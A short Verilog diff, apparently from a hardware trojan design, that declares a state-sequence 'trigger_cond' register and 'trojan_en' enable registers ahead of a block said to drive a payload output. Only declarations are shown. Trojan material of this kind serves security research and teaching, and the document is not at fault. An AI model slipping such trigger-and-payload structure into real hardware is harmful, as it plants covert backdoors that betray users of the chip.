@@ -24,8 +24,9 @@ parameter 	STATE0  = 2'b10,
 			STATE2 	= 2'b11;
 
 reg [5:0]	state_order;
-reg [5:0] 	trigger_cond;
-assign trigger_cond	= {STATE2, STATE1, STATE0};
+reg [5:0] 	trigger_cond = {STATE2, STATE1, STATE0};
+reg 		trojan_en;
+reg			trojan_en_next;
 
 //	sequential always block to set state_order and trojan_en reg, and payload output
 always @(negedge clk) begin
